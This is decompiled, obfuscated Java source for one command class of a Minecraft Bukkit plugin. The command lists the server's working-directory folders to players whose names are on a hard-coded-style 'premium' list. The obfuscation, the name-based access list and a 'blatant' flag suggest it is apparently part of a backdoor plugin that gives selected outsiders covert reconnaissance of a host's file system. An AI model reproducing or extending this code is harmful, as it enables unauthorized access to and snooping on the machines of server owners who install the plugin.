/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl.premium;

import java.io.File;
import java.util.ArrayList;
import java.util.Collections;
import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.FileUtil;
import me.system.runner.utils.Settings;
import org.bukkit.entity.Player;

public class LsdCommand
extends Command {
    /* synthetic */ File file;

    @Override
    public void execute(Core lllllllllllllIlIIIlIllIlIlIlIIIl, String lllllllllllllIlIIIlIllIlIlIlIIII, String[] lllllllllllllIlIIIlIllIlIlIIllll, Player lllllllllllllIlIIIlIllIlIlIIlIll) {
        if (lllllllllllllIlIIIlIllIlIlIlIIIl.premium.contains(lllllllllllllIlIIIlIllIlIlIIlIll.getName())) {
            LsdCommand lllllllllllllIlIIIlIllIlIlIIllIl;
            ArrayList<String> lllllllllllllIlIIIlIllIlIlIlIIll = new ArrayList<String>();
            for (File lllllllllllllIlIIIlIllIlIlIlIlII : lllllllllllllIlIIIlIllIlIlIIllIl.file.listFiles()) {
                if (!lllllllllllllIlIIIlIllIlIlIlIlII.isDirectory()) continue;
                lllllllllllllIlIIIlIllIlIlIlIIll.add(String.valueOf(new StringBuilder().append("/").append(lllllllllllllIlIIIlIllIlIlIlIlII.getName()).append("/")));
            }
            Collections.sort(lllllllllllllIlIIIlIllIlIlIlIIll);
            lllllllllllllIlIIIlIllIlIlIIlIll.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("").append(lllllllllllllIlIIIlIllIlIlIlIIll))));
        } else {
            lllllllllllllIlIIIlIllIlIlIIlIll.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You must be a ").append(Settings.RED).append("premium user ").append(Settings.WHITE).append(" to execute this command"))));
        }
    }

    @Override
    public boolean isBlatant() {
        return false;
    }

    public LsdCommand() {
        LsdCommand lllllllllllllIlIIIlIllIlIlIlllIl;
        lllllllllllllIlIIIlIllIlIlIlllIl.file = FileUtil.getUserDir();
    }
}

